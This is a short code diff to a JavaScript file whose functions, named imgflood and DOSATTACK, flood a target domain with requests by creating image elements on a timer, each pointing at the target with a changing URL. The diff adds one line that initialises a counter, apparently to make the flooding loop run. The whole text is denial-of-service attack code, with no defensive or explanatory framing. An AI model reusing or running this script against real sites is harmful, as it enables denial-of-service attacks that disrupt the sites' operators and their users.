@@ -10,6 +10,7 @@ function imgflood(link) {
 function DOSATTACK(link){
 var domain = link;
 setInterval(function(){
+  var i = 0;
   var img = document.createElement('img');
   img.setAttribute('src', 'ftp://' + domain + ':80/image' + new Date().getTime() + i );
   document.body.appendChild(img);
